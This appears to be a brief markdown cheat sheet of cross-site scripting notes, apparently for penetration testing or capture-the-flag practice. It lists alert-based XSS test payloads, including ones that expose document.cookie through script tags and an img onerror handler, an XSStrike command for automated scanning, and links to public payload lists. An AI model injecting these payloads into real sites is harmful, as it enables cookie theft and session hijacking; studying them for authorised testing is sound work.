# XSS
## Testing for XSS

```javascript
<script>alert(window.origin)</script>
```
```javascript
<script>alert(document.cookie)</script>
```

## DOM XSS
```javascript
<img src="" onerror=alert(document.cookie)>
```
## Automated Discovery
```zsh
python3 xsstrike.py -u "http://<IP:PORT>/<page>.php?<param>=<value>" 
```

## XSS Payloads

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list
